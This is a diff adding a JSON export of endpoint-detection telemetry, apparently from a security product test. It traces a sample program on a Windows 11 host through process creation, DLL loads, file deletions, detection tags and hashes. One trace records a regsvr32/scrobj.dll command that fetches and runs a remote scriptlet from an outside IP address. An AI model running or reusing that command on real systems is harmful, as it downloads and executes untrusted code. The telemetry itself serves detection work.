@@ -1,0 +1,1738 @@
+{
+    "detections": [
+        {
+            "id": "5925991",
+            "traceId": "6021e53d-7d34-458c-9941-327f6efc2869",
+            "firstDetected": "2024-10-21T06:16:35Z",
+            "severity": "s4",
+            "rank": 270,
+            "tags": [
+                "@ATA.CommandAndControl",
+                "@ATA.DefenseEvasion",
+                "@ATA.Execution",
+                "@ATE.T1047",
+                "@ATE.T1059.001",
+                "@ATE.T1059.003",
+                "@ATE.T1105",
+                "@ATE.T1218.010",
+                "@ATE.T1564.004",
+                "@MSI._process_binary_executed_cmd",
+                "@MSI._process_cmd_public_ip",
+                "@MSI._process_lolbas_public_ip",
+                "@MSI._process_regsvr32_geno_cmd",
+                "@MSI._process_regsvr32_register",
+                "@MSI._process_remoteregsvr32_public_ip"
+            ],
+            "host": {
+                "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+                "hostname": "DESKTOP-2HS9OV4",
+                "os": {
+                    "major": 10,
+                    "minor": 0,
+                    "build": 22000,
+                    "sp": "",
+                    "desc": "Windows 11"
+                },
+                "lastBootTime": "2024-10-21T13:09:25Z",
+                "netInterfaces": [
+                    {
+                        "name": "Ethernet0",
+                        "macAddress": "00:50:56:99:9b:c9",
+                        "ip": "2024:1:1:1:8dd1:4cfd:1fa6:8c04",
+                        "type": 6
+                    },
+                    {
+                        "name": "Primary",
+                        "ip": "10.54.13.101"
+                    }
+                ],
+                "traceExtendedVisibility": 0,
+                "hostOs": "windows"
+            },
+            "sha256": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1"
+        }
+    ],
+    "traces": [
+        {
+            "it": 1,
+            "rv": 2,
+            "pid": 3756,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 11044,
+            "tags": [
+                "@AC.ProcessCreated"
+            ],
+            "time": "2024-10-21T13:14:07.214Z",
+            "user": {
+                "id": "S-1-5-21-1948797817-3766102643-2941516715-1001",
+                "name": "mcafee",
+                "domain": "DESKTOP-2HS9OV4"
+            },
+            "dtsId": "EDR",
+            "pSha2": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "cmdLine": "\"C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe\" ",
+            "dtsType": "all",
+            "traceId": "6021e53d-7d34-458c-9941-327f6efc2869",
+            "version": "3.0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "Process Created",
+            "h_version": "3.0",
+            "integrity": 2,
+            "pFullName": "C:\\Windows\\explorer.exe",
+            "tdmRuleIds": [
+                108,
+                100000,
+                100002,
+                100003,
+                100005
+            ],
+            "h_traceType": "all",
+            "processName": "Threat-Sample2.exe",
+            "detectionDate": "2024-10-21T06:16:29Z",
+            "parentTraceId": "307023b5-d6ef-42b0-8be0-602c1b771a05",
+            "procFileAttrs": {
+                "md5": "247FC96F37798A3022ADB9E47BA5DA93",
+                "name": "Threat-Sample2.exe",
+                "path": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe",
+                "sha1": "28AFF3CAC780A5F7D75064C671DC5F67A5FDC39B",
+                "size": 3413039,
+                "sha256": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1",
+                "subsystem": 3,
+                "creationDate": "2024-10-16T14:20:15.272Z"
+            },
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "parentsTraceId": [
+                "307023b5-d6ef-42b0-8be0-602c1b771a05"
+            ],
+            "endTime": null,
+            "originalSeverity": "unknown",
+            "severity": "unknown",
+            "processCharacteristics": "",
+            "contained": "no",
+            "flagged": false,
+            "containedBy": "",
+            "summary": [
+                {
+                    "attribute": "cmdline",
+                    "attributeKey": "cmdLine",
+                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
+                    "summarizable": true,
+                    "shouldDisplayReadMore": true,
+                    "shouldDisplayCopyToClipboard": true
+                },
+                {
+                    "attribute": "domainName",
+                    "attributeKey": "user.domain",
+                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
+                    "summarizable": true
+                },
+                {
+                    "attribute": "user",
+                    "attributeKey": "user.name",
+                    "label": "TRACE_TIMELINE.DETAILS.USER",
+                    "links": [
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
+                            "searchTarget": [
+                                "${maGuid}"
+                            ],
+                            "searchHostname": [
+                                "${hostname}"
+                            ],
+                            "drillDownKey": "PROCESS_USER_ONE",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "LoggedInUsers"
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "LoggedInUsers",
+                                                    "output": "username",
+                                                    "op": "EQUALS",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    ],
+                    "summarizable": true
+                }
+            ],
+            "pidTraceId": "6021e53d-7d34-458c-9941-327f6efc2869",
+            "lastActivityTime": "2024-10-21T13:14:09.424Z",
+            "reputationInfo": {
+                "reason": ""
+            }
+        },
+        {
+            "it": 1,
+            "rv": 2,
+            "pid": 3756,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 3756,
+            "tags": [
+                "@AC.PECreated"
+            ],
+            "time": "2024-10-21T13:14:09.418Z",
+            "dtsId": "EDR",
+            "pSha2": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "dtsType": "all",
+            "traceId": "5c4b8987-8318-4711-ad17-756887bb7bd2",
+            "version": "3.0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "File Deleted",
+            "h_version": "3.0",
+            "pFullName": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe",
+            "h_traceType": "all",
+            "uniqueRuleId": 36,
+            "detectionDate": "2024-10-21T06:16:59Z",
+            "parentTraceId": "6021e53d-7d34-458c-9941-327f6efc2869",
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "fileAttributes": {
+                "md5": "838972583B872F2C503EC88F3CDF55C7",
+                "name": "python27.dll",
+                "path": "C:\\Users\\mcafee\\AppData\\Local\\Temp\\_MEI37562\\python27.dll",
+                "sha1": "1E594B264F2CE7A4D621AEF2BB7BC65343799B34",
+                "size": 3429376,
+                "sha256": "FE55C3AD1E217ADA3A1938F3F1FC7AD2D60E2E9FDF02EF751D6D0D2471350301",
+                "fsattrs": 32,
+                "fileType": "PE",
+                "creationDate": "2024-10-21T13:14:07.641Z",
+                "embedFilename": "python27.dll",
+                "embedVendorName": "Python Software Foundation",
+                "embedFileVersion": "2.7.17",
+                "embedProductName": "Python",
+                "embedProductVersion": "2.7.17",
+                "lastModificationDate": "2024-10-21T13:14:07.673Z"
+            },
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "it": 1,
+            "rv": 2,
+            "pid": 12428,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 3756,
+            "tags": [
+                "@AC.ProcessCreated"
+            ],
+            "time": "2024-10-21T13:14:07.688Z",
+            "user": {
+                "id": "S-1-5-21-1948797817-3766102643-2941516715-1001",
+                "name": "mcafee",
+                "domain": "DESKTOP-2HS9OV4"
+            },
+            "dtsId": "EDR",
+            "pSha2": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "cmdLine": "\"C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe\" ",
+            "dtsType": "all",
+            "traceId": "7a93304f-da5a-4d19-b1b6-f9956a4ddf7c",
+            "version": "3.0",
+            "severity": "s0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "Process Created",
+            "h_version": "3.0",
+            "integrity": 2,
+            "pFullName": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe",
+            "tdmRuleIds": [
+                108,
+                100000,
+                100002,
+                100003,
+                100005
+            ],
+            "h_traceType": "all",
+            "processName": "Threat-Sample2.exe",
+            "detectionDate": "2024-10-21T06:16:29Z",
+            "parentTraceId": "6021e53d-7d34-458c-9941-327f6efc2869",
+            "procFileAttrs": {
+                "md5": "247FC96F37798A3022ADB9E47BA5DA93",
+                "name": "Threat-Sample2.exe",
+                "path": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe",
+                "sha1": "28AFF3CAC780A5F7D75064C671DC5F67A5FDC39B",
+                "size": 3413039,
+                "sha256": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1",
+                "subsystem": 3,
+                "creationDate": "2024-10-16T14:20:15.272Z"
+            },
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "detectionsSets": [
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@ATA.Execution",
+                        "@ATE.T1218.010",
+                        "@ATE.T1059.001",
+                        "@MSI._process_regsvr32_geno_cmd"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATE.T1059.003",
+                        "@MSI._process_binary_executed_cmd"
+                    ]
+                }
+            ],
+            "parentsTraceId": [
+                "6021e53d-7d34-458c-9941-327f6efc2869",
+                "307023b5-d6ef-42b0-8be0-602c1b771a05"
+            ],
+            "endTime": null,
+            "originalSeverity": "s0",
+            "processCharacteristics": "",
+            "contained": "no",
+            "flagged": false,
+            "containedBy": "",
+            "summary": [
+                {
+                    "attribute": "cmdline",
+                    "attributeKey": "cmdLine",
+                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
+                    "summarizable": true,
+                    "shouldDisplayReadMore": true,
+                    "shouldDisplayCopyToClipboard": true
+                },
+                {
+                    "attribute": "domainName",
+                    "attributeKey": "user.domain",
+                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
+                    "summarizable": true
+                },
+                {
+                    "attribute": "user",
+                    "attributeKey": "user.name",
+                    "label": "TRACE_TIMELINE.DETAILS.USER",
+                    "links": [
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
+                            "searchTarget": [
+                                "${maGuid}"
+                            ],
+                            "searchHostname": [
+                                "${hostname}"
+                            ],
+                            "drillDownKey": "PROCESS_USER_ONE",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "LoggedInUsers"
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "LoggedInUsers",
+                                                    "output": "username",
+                                                    "op": "EQUALS",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    ],
+                    "summarizable": true
+                }
+            ],
+            "pidTraceId": "7a93304f-da5a-4d19-b1b6-f9956a4ddf7c",
+            "lastActivityTime": "2024-10-21T13:14:08.349Z",
+            "reputationInfo": {
+                "reason": ""
+            }
+        },
+        {
+            "rv": 2,
+            "pid": 11044,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 10872,
+            "tags": [
+                "@AC.ProcessCreated"
+            ],
+            "time": "2024-10-21T13:10:51.844Z",
+            "user": {
+                "id": "S-1-5-21-1948797817-3766102643-2941516715-1001",
+                "name": "mcafee",
+                "domain": "DESKTOP-2HS9OV4"
+            },
+            "dtsId": "EDR",
+            "pSha2": "2E303B5E8791F2538B5B89542D50A6215C4D9BA4075DDDD9B0A91F635327A2B7",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "cmdLine": "C:\\Windows\\Explorer.EXE",
+            "dtsType": "all",
+            "traceId": "307023b5-d6ef-42b0-8be0-602c1b771a05",
+            "version": "3.0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "Process Created",
+            "h_version": "3.0",
+            "integrity": 2,
+            "pFullName": "",
+            "tdmRuleIds": [
+                104,
+                100003
+            ],
+            "h_traceType": "all",
+            "processName": "explorer.exe",
+            "detectionDate": "2024-10-21T06:15:28Z",
+            "parentTraceId": "00000000-0000-0000-0000-000000000000",
+            "procFileAttrs": {
+                "md5": "088F5B58FBB32C66FF194C606B1F293D",
+                "name": "explorer.exe",
+                "path": "C:\\Windows\\explorer.exe",
+                "sha1": "7F1764F80976922BFAD92745C2D45990BF563479",
+                "size": 5092056,
+                "sha256": "2E303B5E8791F2538B5B89542D50A6215C4D9BA4075DDDD9B0A91F635327A2B7",
+                "subsystem": 2,
+                "reputation": {
+                    "reputation": 99,
+                    "vtpPrivileges": 1
+                },
+                "creationDate": "2024-10-16T14:30:45.050Z",
+                "embedFilename": "EXPLORER.EXE",
+                "embedVendorName": "Microsoft Corporation",
+                "embedFileVersion": "10.0.22000.2538 (WinBuild.160101.0800)",
+                "embedProductName": "Microsoft® Windows® Operating System",
+                "embedProductVersion": "10.0.22000.2538"
+            },
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "parentsTraceId": [],
+            "endTime": null,
+            "originalSeverity": "unknown",
+            "severity": "unknown",
+            "processCharacteristics": "",
+            "contained": "no",
+            "flagged": false,
+            "containedBy": "",
+            "summary": [
+                {
+                    "attribute": "cmdline",
+                    "attributeKey": "cmdLine",
+                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
+                    "summarizable": true,
+                    "shouldDisplayReadMore": true,
+                    "shouldDisplayCopyToClipboard": true
+                },
+                {
+                    "attribute": "domainName",
+                    "attributeKey": "user.domain",
+                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
+                    "summarizable": true
+                },
+                {
+                    "attribute": "user",
+                    "attributeKey": "user.name",
+                    "label": "TRACE_TIMELINE.DETAILS.USER",
+                    "links": [
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
+                            "searchTarget": [
+                                "${maGuid}"
+                            ],
+                            "searchHostname": [
+                                "${hostname}"
+                            ],
+                            "drillDownKey": "PROCESS_USER_ONE",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "LoggedInUsers"
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "LoggedInUsers",
+                                                    "output": "username",
+                                                    "op": "EQUALS",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    ],
+                    "summarizable": true
+                }
+            ],
+            "pidTraceId": "307023b5-d6ef-42b0-8be0-602c1b771a05",
+            "lastActivityTime": "2024-10-21T13:14:07.214Z",
+            "reputationInfo": {
+                "reason": ""
+            }
+        },
+        {
+            "it": 1,
+            "rv": 2,
+            "pid": 3756,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 3756,
+            "tags": [
+                "@AC.LoadedDLLs"
+            ],
+            "time": "2024-10-21T13:14:07.574Z",
+            "dtsId": "EDR",
+            "pSha2": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "dtsType": "all",
+            "modules": [
+                {
+                    "name": "C:\\Windows\\System32\\ws2_32.dll",
+                    "sha256": "BE5E34C919109DBB2DC5EBE18B0355F26506326147FBE61EAB22C11CD2905E9E",
+                    "fsattrs": 32,
+                    "loadTime": "2024-10-21T13:14:07.574Z",
+                    "vtpPrivileges": 1
+                }
+            ],
+            "traceId": "ff3ed454-9c24-4d04-b099-a4c7dcc750c8",
+            "version": "3.0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "Image Loaded",
+            "h_version": "3.0",
+            "pFullName": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe",
+            "h_traceType": "all",
+            "uniqueRuleId": 18,
+            "detectionDate": "2024-10-21T06:16:29Z",
+            "parentTraceId": "6021e53d-7d34-458c-9941-327f6efc2869",
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3"
+        },
+        {
+            "it": 1,
+            "rv": 2,
+            "pid": 12440,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 12428,
+            "tags": [
+                "@AC.AdminHackingToolExecuted",
+                "@AC.ProcessCreated"
+            ],
+            "time": "2024-10-21T13:14:08.349Z",
+            "user": {
+                "id": "S-1-5-21-1948797817-3766102643-2941516715-1001",
+                "name": "mcafee",
+                "domain": "DESKTOP-2HS9OV4"
+            },
+            "dtsId": "EDR",
+            "pSha2": "F6C9532E1F4B66BE96F0F56BD7C3A3C1997EA8066B91BFCC984E41F072C347BA",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "cmdLine": "C:\\Windows\\system32\\cmd.exe /c cmd /c \"REGSVR32 /u /n /s /i:http://216.58.194.85\\folder\\payload.sct scrobj.dll\"",
+            "dtsType": "all",
+            "pattern": "cmd",
+            "traceId": "94736f85-c772-4549-a36b-0d5ecaeae897",
+            "version": "3.0",
+            "severity": "s0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "Process Created",
+            "h_version": "3.0",
+            "integrity": 2,
+            "nonpeType": "file",
+            "pFullName": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe",
+            "tdmRuleIds": [
+                103,
+                100000,
+                100003
+            ],
+            "h_traceType": "all",
+            "interpreter": "cmd",
+            "nonpeScript": "cmd",
+            "processName": "cmd.exe",
+            "detectionDate": "2024-10-21T06:16:29Z",
+            "parentTraceId": "7a93304f-da5a-4d19-b1b6-f9956a4ddf7c",
+            "procFileAttrs": {
+                "md5": "C5DB7B712F280C3AE4F731AD7D5EA171",
+                "name": "cmd.exe",
+                "path": "C:\\Windows\\System32\\cmd.exe",
+                "sha1": "E8717FF0D40E01FD3B06DE2AA5A401BED1C907CC",
+                "size": 331776,
+                "sha256": "F6C9532E1F4B66BE96F0F56BD7C3A3C1997EA8066B91BFCC984E41F072C347BA",
+                "subsystem": 3,
+                "reputation": {
+                    "reputation": 99,
+                    "vtpPrivileges": 1
+                },
+                "creationDate": "2021-06-05T12:05:12.279Z",
+                "embedFilename": "Cmd.Exe",
+                "embedVendorName": "Microsoft Corporation",
+                "embedFileVersion": "10.0.22000.1 (WinBuild.160101.0800)",
+                "embedProductName": "Microsoft® Windows® Operating System",
+                "embedProductVersion": "10.0.22000.1"
+            },
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "detectionsSets": [
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@ATA.Execution",
+                        "@ATE.T1218.010",
+                        "@ATE.T1059.001",
+                        "@MSI._process_regsvr32_geno_cmd"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@ATA.Execution",
+                        "@ATE.T1218.010",
+                        "@ATE.T1059.001",
+                        "@MSI._process_regsvr32_geno_cmd"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATE.T1059.003",
+                        "@MSI._process_cmd_public_ip"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATE.T1059.003",
+                        "@MSI._process_binary_executed_cmd"
+                    ]
+                }
+            ],
+            "parentsTraceId": [
+                "7a93304f-da5a-4d19-b1b6-f9956a4ddf7c",
+                "6021e53d-7d34-458c-9941-327f6efc2869",
+                "307023b5-d6ef-42b0-8be0-602c1b771a05"
+            ],
+            "endTime": null,
+            "originalSeverity": "s0",
+            "processCharacteristics": "",
+            "contained": "no",
+            "flagged": false,
+            "containedBy": "",
+            "summary": [
+                {
+                    "attribute": "cmdline",
+                    "attributeKey": "cmdLine",
+                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
+                    "summarizable": true,
+                    "shouldDisplayReadMore": true,
+                    "shouldDisplayCopyToClipboard": true
+                },
+                {
+                    "attribute": "domainName",
+                    "attributeKey": "user.domain",
+                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
+                    "summarizable": true
+                },
+                {
+                    "attribute": "user",
+                    "attributeKey": "user.name",
+                    "label": "TRACE_TIMELINE.DETAILS.USER",
+                    "links": [
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
+                            "searchTarget": [
+                                "${maGuid}"
+                            ],
+                            "searchHostname": [
+                                "${hostname}"
+                            ],
+                            "drillDownKey": "PROCESS_USER_ONE",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "LoggedInUsers"
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "LoggedInUsers",
+                                                    "output": "username",
+                                                    "op": "EQUALS",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    ],
+                    "summarizable": true
+                }
+            ],
+            "pidTraceId": "94736f85-c772-4549-a36b-0d5ecaeae897",
+            "lastActivityTime": "2024-10-21T13:14:08.624Z",
+            "reputationInfo": {
+                "reason": ""
+            }
+        },
+        {
+            "it": 1,
+            "rv": 2,
+            "pid": 3756,
+            "h_os": "windows",
+            "h_tp": "mar_50.0.0.2",
+            "host": "DESKTOP-2HS9OV4",
+            "ppid": 3756,
+            "tags": [
+                "@AC.NonPECreated"
+            ],
+            "time": "2024-10-21T13:14:09.424Z",
+            "dtsId": "EDR",
+            "pSha2": "211C2E02764A3B683948E08E44FB73B83FECDDAA6B567A40DBCB1AAEB6EE7DE1",
+            "maGuid": "A99BE56D-905E-4905-B7CE-D18B2D149D58",
+            "dtsType": "all",
+            "traceId": "2ea38000-b837-47a1-97a2-84d1ad53c621",
+            "version": "3.0",
+            "tenantId": "3474F349-9405-49D0-A01C-284B80D48F88",
+            "eventType": "File Deleted",
+            "h_version": "3.0",
+            "pFullName": "C:\\Users\\mcafee\\Desktop\\ThreatSamples\\samples\\Threat-Sample2.exe",
+            "h_traceType": "all",
+            "uniqueRuleId": 6,
+            "detectionDate": "2024-10-21T06:16:59Z",
+            "parentTraceId": "6021e53d-7d34-458c-9941-327f6efc2869",
+            "contextTraceId": "91ecda63-ef9c-485a-8c0c-8c125500e6c3",
+            "fileAttributes": {
+                "md5": "",
+                "name": "_MEI37562",
